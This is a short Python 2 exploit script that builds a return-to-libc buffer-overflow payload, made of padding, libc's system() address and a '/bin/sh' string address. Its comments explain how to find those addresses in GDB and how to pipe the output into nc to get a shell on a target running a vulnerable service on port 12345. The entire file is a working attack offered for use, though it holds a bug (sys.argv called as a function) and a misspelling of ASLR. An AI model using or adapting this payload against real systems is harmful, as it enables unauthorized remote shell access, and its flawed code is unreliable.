#work only with ASRL disabled
#to run exploit type this on bash:
#(python exploit.py <IP> ; cat )| nc <IP> 12345
import struct
import sys
def Exploit(local_ip):
    strin="89\nsystem\n"+local_ip+"\n127.0.0.1\nAAA\n"
    pad="A"*64+"BBBBCCCCDDDD"
    #insert here the address of the system call function(found out by command "print system" of GDB)
    sys=struct.pack("I",0xb7e633e0)
    ret="AAAA"
    #found out the start address of libc by command "info proc mapping" of GDB
    #insert here the address of "/bin/sh" string (found out by GDB command : find <start_addr_libc>,+99999,"/bin/sh")
    bin=struct.pack("I",0xb7f84551)
    pad1="\0"*20
    print strin+pad+sys+ret+bin+pad1
if __name__ == '__main__':
    if(len(sys.argv)<2):
        print "insert ip"
        exit(0)
    Exploit(sys.argv(1))

